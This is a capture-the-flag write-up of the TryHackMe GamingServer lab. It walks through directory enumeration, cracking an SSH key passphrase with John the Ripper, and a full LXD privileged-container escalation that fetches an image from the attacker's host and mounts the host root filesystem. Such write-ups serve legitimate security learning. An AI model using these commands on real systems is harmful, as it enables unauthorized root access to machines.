# GamingServer - TryHackMe

Linux machine with a static website exposing sensitive files. The attack path reads a username from an HTML comment, retrieves a private SSH key and a custom wordlist through directory enumeration, cracks the key passphrase with John the Ripper, then escalates privileges by abusing `lxd` group membership to mount the host filesystem inside a privileged container.

---

## Enumeration

### Network Scanning

```bash
rustscan -a 10.65.161.38 -- -sC -sV
```

Open ports:

- 22/tcp - SSH
- 80/tcp - HTTP

### Web Enumeration

The site source contained an HTML comment revealing a potential username: `john`.

Directory enumeration:

```bash
gobuster dir -u http://10.65.161.38/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Two directories of interest:

- `/uploads` - contained a custom wordlist `dict.lst`
- `/secret` - contained an RSA private key

---

## Initial Access

### Cracking the SSH Key Passphrase

The private key was passphrase-protected. Convert to John format and crack using the wordlist found on the target:

```bash
chmod 600 ~/key_rsa
python3 ssh2john.py ~/key_rsa > ~/key.hash
john ~/key.hash --wordlist=~/dict.lst
john --show ~/key.hash
```

Passphrase recovered:

```
letmein
```

`letmein` is the private key passphrase, not the system account password.

### SSH Access

```bash
ssh john@10.65.161.38 -i ~/key_rsa
```

Enter `letmein` when prompted for the key passphrase.

User flag:

```bash
cat ~/user.txt
```

---

## Privilege Escalation

### Group Enumeration

```bash
id
```

Output revealed `john` is a member of the `lxd` group. Members of this group can create privileged containers with host filesystem mounts - functionally equivalent to root access.

### LXD Container Escape

**On the attack box (Kali):**

Build a minimal Alpine image and serve it over HTTP:

```bash
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
chmod +x build-alpine
sudo ./build-alpine
sudo python3 -m http.server 8000
```

**On the target (as john):**

```bash
cd /tmp
wget http://10.65.106.71:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

Inside the container, the host root filesystem is mounted at `/mnt/root`:

```bash
cd /mnt/root/root
cat root.txt
```

---

## Flags

```
user.txt  -> /home/john/user.txt
root.txt  -> /mnt/root/root/root.txt (via LXD container)
```

---

## Key Takeaways

- A static website can expose a username (HTML comment), a custom wordlist, and a private key through directory enumeration alone - no active exploitation needed at this stage.
- The wordlist that cracks the key passphrase was hosted on the same target. Check discovered files for contextual relevance before defaulting to rockyou.
- `lxd` group membership is functionally equivalent to root. `id` after initial access is as important as `sudo -l`.
- The LXD escalation mounts the host `/` at `/mnt/root` inside a privileged container. Setting `security.privileged=true` removes the container boundary entirely.
- `letmein` is the key passphrase, not the SSH user password. Mixing them up causes an auth failure that appears as a locked account.

---

## Disclaimer

This lab was completed in a controlled environment provided by TryHackMe. All actions were performed strictly for educational purposes.
